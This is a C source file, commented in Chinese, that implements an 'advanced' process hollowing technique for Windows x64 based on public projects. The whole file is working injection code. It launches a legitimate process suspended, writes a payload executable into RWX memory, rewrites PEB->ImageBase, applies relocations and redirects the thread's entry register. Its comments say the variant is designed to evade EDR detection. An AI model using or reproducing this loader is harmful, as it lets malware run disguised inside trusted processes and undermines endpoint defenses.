/**
 * ===================================================================
 * Advanced Process Hollowing (No NtUnmapViewOfSection)
 * ===================================================================
 *
 * 基于 PichichiH0ll0wer 项目的改进型 Process Hollowing
 *
 * 核心创新：
 * 传统 Process Hollowing 使用 NtUnmapViewOfSection 卸载原始镜像
 * 这个调用非常可疑，容易被 EDR 检测
 *
 * 本技术的改进：
 * 1. 不使用 NtUnmapViewOfSection
 * 2. 直接在目标进程分配新内存
 * 3. 修改 PEB->ImageBase 指向新内存
 * 4. 应用 PE 重定位（如果需要）
 * 5. 修改线程 RCX 寄存器指向新入口点
 *
 * 参考：
 * - https://github.com/itaymigdal/PichichiH0ll0wer
 * - https://github.com/hasherezade/libpeconv
 */

#include <windows.h>
#include <stdio.h>
#include <winternl.h>

// ===== NT API 类型定义 =====
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

// ===== 重定位结构 =====
typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

typedef struct _BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

/**
 * ===================================================================
 * 应用 PE 重定位
 *
 * 当 PE 被加载到非首选地址时，需要修复所有绝对地址引用
 * ===================================================================
 */
BOOL ApplyRelocations(
    LPVOID localPeBuffer,
    LPVOID newImageBase,
    HANDLE hProcess
) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)localPeBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)localPeBuffer + dosHeader->e_lfanew);

    // 计算 delta（新地址 - 首选地址）
    ULONGLONG delta = (ULONGLONG)newImageBase - ntHeaders->OptionalHeader.ImageBase;

    if (delta == 0) {
        printf("[+] No relocation needed (loaded at preferred address)\n");
        return TRUE;
    }

    printf("[*] Applying relocations (delta: 0x%llX)\n", delta);

    // 获取重定位表
    PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir->VirtualAddress == 0) {
        printf("[-] No relocation table found\n");
        return FALSE;
    }

    // 查找 .reloc 节
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    PIMAGE_SECTION_HEADER relocSection = NULL;

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".reloc") == 0) {
            relocSection = &section[i];
            break;
        }
    }

    if (!relocSection) {
        printf("[-] .reloc section not found\n");
        return FALSE;
    }

    // 遍历重定位块
    DWORD relocOffset = 0;
    PBYTE relocBase = (PBYTE)localPeBuffer + relocSection->PointerToRawData;

    while (relocOffset < relocDir->Size) {
        PBASE_RELOCATION_BLOCK block = (PBASE_RELOCATION_BLOCK)(relocBase + relocOffset);

        if (block->BlockSize == 0) break;

        DWORD entryCount = (block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY entries = (PBASE_RELOCATION_ENTRY)(block + 1);

        for (DWORD i = 0; i < entryCount; i++) {
            if (entries[i].Type == IMAGE_REL_BASED_ABSOLUTE) {
                continue; // 跳过
            }

            if (entries[i].Type == IMAGE_REL_BASED_DIR64) {
                // 计算需要修复的地址在远程进程中的位置
                LPVOID fixupAddress = (LPVOID)((ULONG_PTR)newImageBase + block->PageAddress + entries[i].Offset);

                // 读取原始值
                ULONGLONG originalValue = 0;
                SIZE_T bytesRead;
                if (!ReadProcessMemory(hProcess, fixupAddress, &originalValue, sizeof(ULONGLONG), &bytesRead)) {
                    printf("[-] Failed to read at 0x%p for relocation\n", fixupAddress);
                    continue;
                }

                // 应用 delta
                ULONGLONG newValue = originalValue + delta;

                // 写回
                SIZE_T bytesWritten;
                if (!WriteProcessMemory(hProcess, fixupAddress, &newValue, sizeof(ULONGLONG), &bytesWritten)) {
                    printf("[-] Failed to write at 0x%p for relocation\n", fixupAddress);
                    return FALSE;
                }
            }
        }

        relocOffset += block->BlockSize;
    }

    printf("[+] Relocations applied successfully\n");
    return TRUE;
}

/**
 * ===================================================================
 * 读取 PE 文件
 * ===================================================================
 */
BOOL ReadPeFile(const char* fileName, PVOID* buffer, DWORD* size) {
    HANDLE hFile = CreateFileA(fileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open file: %s (Error: %lu)\n", fileName, GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("[-] Failed to get file size (Error: %lu)\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    *buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
    if (!*buffer) {
        printf("[-] Failed to allocate memory\n");
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, *buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[-] Failed to read file (Error: %lu)\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, *buffer);
        CloseHandle(hFile);
        return FALSE;
    }

    *size = fileSize;
    CloseHandle(hFile);
    return TRUE;
}

/**
 * ===================================================================
 * Advanced Process Hollowing（不使用 NtUnmapViewOfSection）
 * ===================================================================
 */
BOOL AdvancedProcessHollowing(const char* targetPath, const char* payloadPath) {
    PVOID payloadBuffer = NULL;
    DWORD payloadSize = 0;
    PROCESS_INFORMATION pi = {0};
    STARTUPINFOA si = {sizeof(si)};
    BOOL success = FALSE;

    printf("\n===================================================================\n");
    printf("Advanced Process Hollowing (No NtUnmapViewOfSection)\n");
    printf("===================================================================\n\n");

    printf("[*] Target: %s\n", targetPath);
    printf("[*] Payload: %s\n\n", payloadPath);

    // 第一步：读取 payload PE
    printf("[*] Step 1: Reading payload PE file...\n");
    if (!ReadPeFile(payloadPath, &payloadBuffer, &payloadSize)) {
        goto CLEANUP;
    }
    printf("[+] Payload loaded: %lu bytes\n", payloadSize);

    // 第二步：解析 PE
    printf("\n[*] Step 2: Parsing PE headers...\n");
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid DOS signature\n");
        goto CLEANUP;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)payloadBuffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Invalid NT signature\n");
        goto CLEANUP;
    }

    LPVOID preferredBase = (LPVOID)ntHeaders->OptionalHeader.ImageBase;
    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    DWORD entryPoint = ntHeaders->OptionalHeader.AddressOfEntryPoint;

    printf("[+] Preferred ImageBase: 0x%p\n", preferredBase);
    printf("[+] Image Size: 0x%zX\n", imageSize);
    printf("[+] Entry Point RVA: 0x%lX\n", entryPoint);

    // 第三步：创建挂起的目标进程
    printf("\n[*] Step 3: Creating suspended target process...\n");
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create process (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Process created (PID: %lu)\n", pi.dwProcessId);

    // 第四步：获取 PEB 地址
    printf("\n[*] Step 4: Retrieving PEB address...\n");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
                                               &pbi, sizeof(pbi), &returnLength);
    if (status != 0) {
        printf("[-] NtQueryInformationProcess failed (Status: 0x%lX)\n", status);
        goto CLEANUP;
    }

    PVOID pebAddress = pbi.PebBaseAddress;
    printf("[+] PEB Address: 0x%p\n", pebAddress);

    // 第五步：在目标进程分配内存（尝试首选地址）
    printf("\n[*] Step 5: Allocating memory in target process...\n");
    printf("[*] Trying preferred address: 0x%p\n", preferredBase);

    LPVOID newImageBase = VirtualAllocEx(pi.hProcess, preferredBase, imageSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!newImageBase) {
        printf("[-] Failed at preferred address, trying any address...\n");
        newImageBase = VirtualAllocEx(pi.hProcess, NULL, imageSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!newImageBase) {
        printf("[-] Failed to allocate memory (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }

    printf("[+] New ImageBase: 0x%p\n", newImageBase);
    printf("[+] New EntryPoint: 0x%p\n", (LPVOID)((ULONG_PTR)newImageBase + entryPoint));

    // 第六步：复制 PE 头部
    printf("\n[*] Step 6: Copying PE headers...\n");
    if (!WriteProcessMemory(pi.hProcess, newImageBase, payloadBuffer,
                           ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
        printf("[-] Failed to write headers (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Headers copied\n");

    // 第七步：复制 PE 节
    printf("\n[*] Step 7: Copying PE sections...\n");
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID sectionDest = (LPVOID)((ULONG_PTR)newImageBase + section[i].VirtualAddress);
        PVOID sectionSrc = (PVOID)((ULONG_PTR)payloadBuffer + section[i].PointerToRawData);

        printf("[*] Section %d: %s (0x%lX bytes at 0x%p)\n",
               i, section[i].Name, section[i].SizeOfRawData, sectionDest);

        if (!WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc,
                               section[i].SizeOfRawData, NULL)) {
            printf("[-] Failed to write section (Error: %lu)\n", GetLastError());
            goto CLEANUP;
        }
    }
    printf("[+] All sections copied\n");

    // 第八步：修改 PEB->ImageBase
    printf("\n[*] Step 8: Updating PEB->ImageBase...\n");
    // PEB->ImageBase 在偏移 0x10
    LPVOID pebImageBaseAddress = (LPVOID)((ULONG_PTR)pebAddress + 0x10);

    if (!WriteProcessMemory(pi.hProcess, pebImageBaseAddress, &newImageBase,
                           sizeof(PVOID), NULL)) {
        printf("[-] Failed to update PEB (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] PEB->ImageBase updated to: 0x%p\n", newImageBase);

    // 第九步：应用重定位（如果需要）
    printf("\n[*] Step 9: Applying relocations...\n");
    if (newImageBase != preferredBase) {
        if (!ApplyRelocations(payloadBuffer, newImageBase, pi.hProcess)) {
            printf("[-] Failed to apply relocations\n");
            goto CLEANUP;
        }
    } else {
        printf("[+] Loaded at preferred address, no relocation needed\n");
    }

    // 第十步：修改线程 RCX 寄存器指向新入口点
    printf("\n[*] Step 10: Updating thread context (RCX register)...\n");
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_INTEGER;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[-] Failed to get thread context (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }

    ULONG_PTR newEntryPoint = (ULONG_PTR)newImageBase + entryPoint;
    printf("[*] Original RCX: 0x%llX\n", ctx.Rcx);
    printf("[*] New RCX (EntryPoint): 0x%llX\n", newEntryPoint);

    ctx.Rcx = newEntryPoint;

    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[-] Failed to set thread context (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Thread context updated\n");

    // 第十一步：恢复线程
    printf("\n[*] Step 11: Resuming thread...\n");
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf("[-] Failed to resume thread (Error: %lu)\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Thread resumed\n");

    printf("\n===================================================================\n");
    printf("[+] Advanced Hollowing completed successfully!\n");
    printf("===================================================================\n");

    // 等待payload执行
    printf("\n[*] Waiting 5 seconds for payload to execute...\n");
    Sleep(5000);

    // 检查验证文件
    HANDLE hVerify = CreateFileA(
        "C:\\Users\\Public\\advanced_hollowing_verified.txt",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hVerify != INVALID_HANDLE_VALUE) {
        printf("[+] Verification file found - Payload executed successfully!\n");
        CloseHandle(hVerify);
    } else {
        printf("[!] Verification file not found - Payload may not have executed\n");
    }

    // 检查进程状态
    DWORD exitCode = 0;
    if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
        if (exitCode == STILL_ACTIVE) {
            printf("[+] Target process still running (PID: %lu)\n", pi.dwProcessId);
        } else {
            printf("[!] Target process exited (Exit code: %lu)\n", exitCode);
        }
    }

    success = TRUE;

CLEANUP:
    if (payloadBuffer) {
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
    }

    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);

    return success;
}

/**
 * ===================================================================
 * 主函数
 * ===================================================================
 */
int main(int argc, char* argv[]) {
    printf("===================================================================\n");
    printf("Advanced Process Hollowing (No NtUnmapViewOfSection)\n");
    printf("Based on: PichichiH0ll0wer by itaymigdal\n");
    printf("===================================================================\n\n");

    if (argc < 3) {
        printf("Usage: %s <target.exe> <payload.exe>\n", argv[0]);
        printf("\nExample:\n");
        printf("  %s \"C:\\Windows\\System32\\calc.exe\" payload.exe\n", argv[0]);
        printf("\nNote:\n");
        printf("  - target.exe: Legitimate process to hollow (e.g., calc.exe)\n");
        printf("  - payload.exe: Your PE executable to inject\n");
        return 1;
    }

    BOOL result = AdvancedProcessHollowing(argv[1], argv[2]);

    if (!result) {
        printf("\n[-] Hollowing failed!\n");
        return 1;
    }

    printf("\n[*] Press Enter to exit...\n");
    getchar();

    return 0;
}
